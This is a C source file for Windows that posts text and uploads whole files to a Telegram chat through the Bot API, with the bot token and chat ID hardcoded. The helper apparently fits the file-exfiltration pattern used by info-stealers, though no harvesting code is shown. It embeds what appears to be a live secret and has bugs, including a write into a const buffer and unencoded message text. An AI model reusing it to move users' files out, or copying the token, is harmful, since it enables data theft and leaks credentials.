#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

#include "win_telegram.h"
#define BOT_TOKEN "7657850524:AAEKV1lZpTcbqreAhRVnMiIbUGZhdwaqgAI"
#define CHAT_ID "-1004296248557"

int send_telegram_text(const char* text)
{
	HINTERNET hSession = InternetOpenA("WinTelegram", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hSession) {
		return -1;
	}

	HINTERNET hConnect = InternetConnectA(hSession, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hSession);
		return -1;
	}
	char url_path[256];
	snprintf(url_path, sizeof(url_path), "/bot%s/sendMessage", BOT_TOKEN);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", url_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return -1; 
	}

	char* header = "Content-Type: application/x-www-form-urlencoded";
	char post_data[512];

	snprintf(post_data, sizeof(post_data), "chat_id=%s&text=%s", CHAT_ID, text);
	BOOL result = HttpSendRequestA(hRequest, header, (DWORD)strlen(header), post_data, (DWORD)strlen(post_data));
	if (!result) {
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return -1;
	}
	HttpEndRequest(hRequest, NULL, 0, 0);
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);


	return result ? 0 : -1;
}

int send_telegram_file(const char* file_path) {
	HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return -1;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);	
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		CloseHandle(hFile);
		return -1;	
	}
	char* fileBuffer = (char*)malloc(fileSize);
	if (!fileBuffer) {
		CloseHandle(hFile);
		return -1;
	}
	DWORD bytesRead;
	if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL)) {
	    free(fileBuffer);
	    CloseHandle(hFile);
	    return -1;
	}
	CloseHandle(hFile);

	const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

	const char header[512];
	snprintf(header, sizeof(header), "Content-Type: multipart/form-data; boundary=%s\r\n", boundary);

	char request[1024];
	snprintf(request, sizeof(request), "--%s\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"document\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", boundary, CHAT_ID, boundary, file_path);

	char end_boundary[256];
	snprintf(end_boundary, sizeof(end_boundary), "\r\n--%s--\r\n", boundary);

	DWORD reqLen = (DWORD)strlen(request);
	DWORD endBoundaryLen = (DWORD)strlen(end_boundary);
	DWORD totalDataLen = reqLen  + fileSize + endBoundaryLen;

	char* post_data = (char*)malloc(totalDataLen);

	memcpy(post_data, request, reqLen);
	memcpy(post_data + reqLen, fileBuffer, fileSize);
	memcpy(post_data + reqLen + fileSize, end_boundary, endBoundaryLen);

	HINTERNET hSession = InternetOpenA("WinTelegram", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hSession) {
		free(fileBuffer);
		return -1;
	}
	HINTERNET hConnect = InternetConnectA(hSession, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hSession);
		free(fileBuffer);
		return -1;
	}
	char url_path[256];
	snprintf(url_path, sizeof(url_path), "/bot%s/sendDocument", BOT_TOKEN);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", url_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
	
	BOOL result = HttpSendRequestA(hRequest, header, (DWORD)strlen(header), post_data, totalDataLen);
	free(fileBuffer);
	free(post_data);
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
	return result ? 0 : -1;

}